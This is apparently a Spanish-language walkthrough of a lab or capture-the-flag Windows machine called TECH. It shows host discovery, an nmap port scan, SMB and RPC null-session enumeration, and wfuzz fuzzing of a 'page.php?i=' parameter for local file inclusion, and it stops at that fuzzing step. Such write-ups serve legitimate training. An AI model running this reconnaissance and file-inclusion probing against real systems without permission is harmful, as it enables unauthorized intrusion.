## COMPROBAMOS IP DE LA MAQUINA VICTIMA

ejecutamos:
```bash
sudo arp-scan -l | grep "PCS"
```
y la IP victima es `192.168.1.46`

![TECH](images/tech/1.png)

## SCAN DE PUERTOS Y SERVICIOS

Ejecutamos un scan de puertos abiertos y vemos los servicios y versiones que corren por ellos:

```bash
sudo nmap -sS -sCV --open -p- --min-rate 5000 192.168.1.46 -vvv -oN nmap
```

![TECH](images/tech/2.png)


![TECH](images/tech/3.png)


## ENUMERACION SMB 445

Enumeración básica:
```bash
netexec smb 192.168.1.46
```
```
SMB         192.168.1.46    445    TECH             [*] Windows 10 / Server 2019 Build 17763 x64 (name:TECH) (domain:TECH) (signing:False) (SMBv1:None)
```

vemos un windows arquitectura x64 y un dominio `TECH`


Enumeracion de SHERES con null session:
```bash
smbclient -NL //192.168.1.46
smbmap --no-banner -H 192.168.1.46 -u '' -p ''
netexec smb 192.168.1.46 -u '' -p '' --shares
```

![TECH](images/tech/4.png)


RCP:
```bash
rpcclient -NU "" 192.168.1.46 -c "srvinfo"
```

![TECH](images/tech/5.png)


No encontrando nada nos amos a la página web y vemos si encontramos algo.



## ENUMERACION DE LA WEB

Nos encontramos con esta web:

![TECH](images/tech/6.png)


y revisando el código fuente vemos algo interesante:

![TECH](images/tech/7.png)

si abrimos el enlace vemos que el parametro "i" nos refleja esas tres páginas


![TECH](images/tech/9.png)


## FUZZING

lanzo un ataque de fuzzing para ver si podemos leer archivos internos de la máquina:

```bash

 wfuzz -c --hc=404 --hh=0 -w /home/kali/Desktop/maquina/trabajo/diccionarios/rutas_windows_lfi.txt "http://192.168.1.46/page.php?i=FUZZ"
```

![TECH](images/tech/10.png)


el diccionario que utilicé es:

`https://github.com/lavafuego/Diccionarios/blob/main/diccionario_rutas_windows.md`


